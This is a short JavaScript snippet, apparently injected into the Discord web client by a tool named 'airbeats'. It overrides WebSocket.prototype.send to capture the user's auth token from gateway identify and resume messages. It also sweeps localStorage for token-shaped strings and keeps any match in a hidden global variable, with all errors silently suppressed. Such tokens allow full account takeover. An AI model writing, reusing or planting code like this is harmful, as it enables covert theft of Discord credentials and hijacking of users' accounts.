(function () {
  if (window.__airbeatsHooked) return;
  window.__airbeatsHooked = true;

  function save(t) {
    t = String(t || '').trim().replace(/^["']|["']$/g, '');
    if (/^(mfa\.)?[\w-]{20,}\.[\w-]{6,}\.[\w-]{20,}$/.test(t)) {
      window.__airbeatsDiscordToken = t;
    }
  }

  try {
    var origSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function (data) {
      try {
        if (typeof data === 'string' && data.charAt(0) === '{') {
          var p = JSON.parse(data);
          if (p && (p.op === 2 || p.op === 6) && p.d && p.d.token) save(p.d.token);
        }
      } catch (e) { }
      return origSend.apply(this, arguments);
    };
  } catch (e) { }

  try {
    var ls = window.localStorage;
    for (var i = 0; i < ls.length; i++) save(ls.getItem(ls.key(i)));
  } catch (e) { }
})();
